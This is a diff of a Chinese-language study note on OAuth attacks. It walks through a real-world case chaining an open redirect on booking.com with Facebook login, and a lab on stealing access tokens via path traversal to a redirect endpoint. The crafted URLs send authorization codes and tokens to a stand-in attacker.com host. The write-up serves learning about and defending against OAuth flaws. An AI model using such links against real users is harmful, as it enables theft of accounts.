@@ -96,7 +96,7 @@ redirect=参数中，域名往往是被严格控制的，这很好理解，为�
 
 理想的攻击情景是，用户点击我们发送的恶意链接，进入Facebook的授权登录界面，用户授权后，url中携带攻击者感兴趣的code跳转到存在url跳转漏洞的`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&code=666666`，紧接着又因为url跳转漏洞跳转到了state所指向的恶意站点。
 
-这里有一个小trick，重定向一般不会携带查询参数（具体得看后端实现），所以我们链接中的&code=666666可能不会被携带向`https://attacker.com/index.php`发起请求，如何解决这个问题呢？关键在于facebook授权登录url中的参数`response_type=`，将其由`response_type=code`更改为`response_type=code, token`，这会使得Facebook不通过参数发送code，而是通过一个标识片段传递，即`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ#code=[secret_code]&access_token=[token]`,url重定向时会携带这个片段标识符
+这里有一个小trick，重定向一般不会携带查询参数，所以我们链接中的&code=666666可能不会被携带向`https://attacker.com/index.php`发起请求，如何解决这个问题呢？关键在于facebook授权登录url中的参数`response_type=`，将其由`response_type=code`更改为`response_type=code, token`，这会使得Facebook不通过参数发送code，而是通过一个标识片段传递，即`https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ#code=[secret_code]&access_token=[token]`,url重定向时会携带这个片段标识符
 
 所以，我们更改最初的链接为`https://www.facebook.com/v3.0/dialog/oauth?redirect_uri=https://account.booking.com/oauth2/authorize?aid=123;client_id=d1cDdLj40ACItEtxJLTo;redirect_uri=https://account.booking.com/settings/oauth_callback;response_type=code, token;state=eyJteXNldHRpbmdzX3BhdGgiOiJodHRwczovL2F0dGFja2VyLmNvbS9pbmRleC5waHAiLCJhaWQiOiIxMjMifQ&scope=email&response_type=code&client_id=210068525731476`，用户点击后，最终跳转到如下请求`https://attacker.com/index.php#code=[secret_code]&access_token=[token]`，攻击者就拦截窃取了code
 
@@ -402,9 +402,30 @@ OIDC的主要组件：
 
 ![image-20240626163442591](./images/image-20240626163442591.png)
 
+#### Stealing OAuth access tokens via an open redirect(结合url跳转漏洞窃取敏感信息)
 
+查看已经在认证服务器上登陆过的情况：
 
+![image-20240627173234293](./images/image-20240627173234293.png)
 
+上一个靶场，我们尝试更改了下图数据包的redirect_url，造成token泄漏给了攻击者，此时再次进行修改redirect_url的尝试，发现不允许
 
+![image-20240627173428095](./images/image-20240627173428095.png)
 
+![image-20240627173542142](./images/image-20240627173542142.png)
 
+但是前面分享的一个真实案例中，给出了另一种redirect_url的利用方式，那就是修改path让其指向一个该站存在url跳转漏洞的链接，让其携带token再次请求攻击者控制的服务器。这个靶场的解题方式和之前的真实案例差不多，我们发现，虽然redirect_url的path不能直接修改，但是可以通过目录穿越的方式，访问到其他path
+
+![image-20240627173936773](./images/image-20240627173936773.png)
+
+![image-20240627174406365](./images/image-20240627174406365.png)
+
+使用/post/next这个path的原因是，我们在此处发现了一个url跳转漏洞
+
+![image-20240627174528800](./images/image-20240627174528800.png)
+
+![image-20240627174542015](./images/image-20240627174542015.png)
+
+构造恶意链接，发送给受害人
+
+![image-20240627174607044](./images/image-20240627174607044.png)
